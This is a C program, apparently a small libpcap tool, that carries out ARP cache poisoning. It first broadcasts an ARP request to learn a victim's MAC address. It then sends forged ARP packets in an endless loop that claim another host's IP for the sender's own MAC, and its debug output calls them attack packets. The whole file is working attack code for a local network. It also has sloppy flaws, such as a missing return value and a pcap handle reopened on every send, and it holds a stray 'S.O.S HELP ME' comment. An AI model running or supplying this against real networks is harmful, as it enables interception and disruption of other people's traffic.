#include "pcap_header.h"

int ARP_Parse(Packet* arp_packet, Target* target)
{
  printf("Dest Mac : ");
  for(int i=0;i<6;i++)
  {
    printf(":%02x",arp_packet->arp_header.SourceHardWareAddress[i]);
    target->Target_Mac[i] = arp_packet->arp_header.SourceHardWareAddress[i];
  }
  printf("\n");
  return 0;
}

void make_arp_packet(Packet* packet, Target* target, int arp_mode)
{
  if(arp_mode == REQUEST)
  {
    packet->ethernet.dest_mac[0] = 0xff;
    packet->ethernet.dest_mac[1] = 0xff;
    packet->ethernet.dest_mac[2] = 0xff;
    packet->ethernet.dest_mac[3] = 0xff;
    packet->ethernet.dest_mac[4] = 0xff;
    packet->ethernet.dest_mac[5] = 0xff;

    packet->arp_header.SourceProtocolAddress[0] = target->My_IP[0];
    packet->arp_header.SourceProtocolAddress[1] = target->My_IP[1];
    packet->arp_header.SourceProtocolAddress[2] = target->My_IP[2];
    packet->arp_header.SourceProtocolAddress[3] = target->My_IP[3];
  }
  else if(arp_mode == REPLY)
  {
    packet->ethernet.dest_mac[0] = target->Target_Mac[0];
    packet->ethernet.dest_mac[1] = target->Target_Mac[1];
    packet->ethernet.dest_mac[2] = target->Target_Mac[2];
    packet->ethernet.dest_mac[3] = target->Target_Mac[3];
    packet->ethernet.dest_mac[4] = target->Target_Mac[4];
    packet->ethernet.dest_mac[5] = target->Target_Mac[5];

    packet->arp_header.SourceProtocolAddress[0] = target->Target_IP[0];
    packet->arp_header.SourceProtocolAddress[1] = target->Target_IP[1];
    packet->arp_header.SourceProtocolAddress[2] = target->Target_IP[2];
    packet->arp_header.SourceProtocolAddress[3] = target->Target_IP[3];
  }
  packet->ethernet.src_mac[0] = target->MyMac[0];
  packet->ethernet.src_mac[1] = target->MyMac[1];
  packet->ethernet.src_mac[2] = target->MyMac[2];
  packet->ethernet.src_mac[3] = target->MyMac[3];
  packet->ethernet.src_mac[4] = target->MyMac[4];
  packet->ethernet.src_mac[5] = target->MyMac[5];
  //set arp protocol
  packet->ethernet.Protocol = htons(0x806);
  //arp header -> setting
  packet->arp_header.HardWare_AddressType = htons(0x1);

  packet->arp_header.Protocol = htons(0x800);
  packet->arp_header.HardWareAddressLength = 0x6;
  packet->arp_header.ProtocolAddressLength = 0x4;
  packet->arp_header.Operation =htons(0x1);
  //set source mac
  packet->arp_header.SourceHardWareAddress[0] = target->MyMac[0];
  packet->arp_header.SourceHardWareAddress[1] = target->MyMac[1];
  packet->arp_header.SourceHardWareAddress[2] = target->MyMac[2];
  packet->arp_header.SourceHardWareAddress[3] = target->MyMac[3];
  packet->arp_header.SourceHardWareAddress[4] = target->MyMac[4];
  packet->arp_header.SourceHardWareAddress[5] = target->MyMac[5];

  //set target Mac
  packet->arp_header.TargetHardWareAddress[0] = target->Target_Mac[0];
  packet->arp_header.TargetHardWareAddress[1] = target->Target_Mac[1];
  packet->arp_header.TargetHardWareAddress[2] = target->Target_Mac[2];
  packet->arp_header.TargetHardWareAddress[3] = target->Target_Mac[3];
  packet->arp_header.TargetHardWareAddress[4] = target->Target_Mac[4];
  packet->arp_header.TargetHardWareAddress[5] = target->Target_Mac[5];
  //set Target IP hardcoding
  packet->arp_header.TargetProtocolAddress[0] = target->Sender_IP[0];
  packet->arp_header.TargetProtocolAddress[1] = target->Sender_IP[1];
  packet->arp_header.TargetProtocolAddress[2] = target->Sender_IP[2];
  packet->arp_header.TargetProtocolAddress[3] = target->Sender_IP[3];
}

int send_arp_packet(Packet* packet, Target* target, int test_mode)
{
  const int packet_size = 42;
  pcap_t* handle = NULL;
  char errbuf[PCAP_ERRBUF_SIZE];
  const char *device = target->wlan_name;
  if((handle = pcap_open_live(device, BUFSIZ, 1, 0, errbuf)) == NULL)
  {
    error_handling("Error pcap open live", true);
  }
  int result=0;
  result = pcap_inject(handle,packet, packet_size);
}
int receive_arp_packet(Packet* packet, Target* target)
{
  int result;
  const char* dev = target->wlan_name;
  char errbuf[PCAP_ERRBUF_SIZE];
  const u_char* network_packet;
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    error_handling("couldn't open device", true);
  }
  while (true) {
    struct pcap_pkthdr* header;
    int res = pcap_next_ex(handle, &header, &network_packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    if((result = check_arp_packet(network_packet)) != 0x806){ //arp packet
      continue;
    }
    else{
      memcpy(packet, network_packet, sizeof(Packet));
      break;
    }
  }
  pcap_close(handle);
  return 0;
}
/*
S.O.S : HELP ME! DISTRESS !!! IF you see this writing , plz report close police office.
*/
int check_arp_packet(const u_char* network_packet)
{
  Ethernet* ethernet = (Ethernet*)network_packet;
  return htons(ethernet->Protocol);
}

int Handler(Target* target)
{
  Packet request_packet;
  Packet reply_packet;
  make_arp_packet(&request_packet, target, REQUEST);
  printf("[DEBUG] Success Make Packet\n");
  send_arp_packet(&request_packet, target,REQUEST);
  printf("[DEBUG] Success Send Packet\n");
  receive_arp_packet(&reply_packet, target);
  printf("[DEBUG] Success Receive Packet\n");
  ARP_Parse(&reply_packet, target);
  printf("[DEBUG] Success Parse Packet\n");
  make_arp_packet(&request_packet, target, REPLY);
  printf("[DEBUG] Success make Packet\n");
  while(1){
    send_arp_packet(&request_packet, target, REPLY);
    printf("[DEBUG] Success Send Attack Packet\n");
  }

}
